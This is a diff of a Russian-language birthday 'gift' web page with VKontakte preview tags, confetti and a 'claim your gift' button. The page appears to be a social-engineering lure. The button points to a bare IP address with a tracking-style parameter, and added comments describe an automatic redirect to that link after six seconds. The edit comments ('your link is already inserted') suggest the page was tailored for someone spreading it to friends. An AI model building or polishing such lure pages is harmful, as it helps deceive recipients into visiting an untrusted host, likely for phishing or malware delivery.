@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>С днём рождения! 🎁</title>
 
+    <!-- Превью для ВКонтакте (ваша картинка уже вставлена) -->
     <meta property="og:type" content="website" />
     <meta property="og:title" content="Тебе подарок! 🎁 Открой скорее" />
     <meta property="og:description" content="Празднуем! Порадуйте друзей подарком." />
@@ -100,7 +101,10 @@
     <div id="confetti-container"></div>
 
     <div class="hero-wrap">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s" alt="Праздничный торт с надписью С Днём Рождения">
+        <!-- Картинка на странице (используем вашу ссылку, чтобы точно работало) -->
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s" alt="Праздничный торт">
+        
+        <!-- ССЫЛКА НА ПОДАРОК (уже вставлена) -->
         <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
             🎁 Забрать подарок
         </a>
@@ -126,6 +130,7 @@
         }
         createConfetti();
 
+        // Автопереход через 6 секунд на вашу ссылку
         const giftBtn = document.getElementById('giftBtn');
         const targetUrl = giftBtn.href;
 
